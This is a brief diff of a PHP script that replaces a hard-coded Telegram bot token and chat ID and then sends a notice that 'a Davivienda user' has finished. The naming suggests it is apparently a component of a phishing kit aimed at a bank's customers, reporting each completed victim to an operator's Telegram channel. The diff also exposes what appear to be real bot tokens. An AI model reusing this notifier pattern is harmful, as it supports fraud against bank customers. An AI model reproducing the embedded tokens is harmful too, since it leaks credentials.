@@ -5,8 +5,8 @@ require_once('../../acciones/bot_telegram.php');
 session_start();
 
 
-$token = "5815633541:AAEMcaDwu8HMK_VjBGaUORPnI82iMKxSiMs";
-$chatId = "-1001894246538";
+$token = "8390867557:AAFoTxbkMrDmVnMD66tqbSZk_T5hvoGx0X4";
+$chatId = "-5085714220";
 
 $mensaje = "Se ha finalizado un usuario Davivienda";
 enviarMensajeTelegram($chatId, $mensaje, $token);
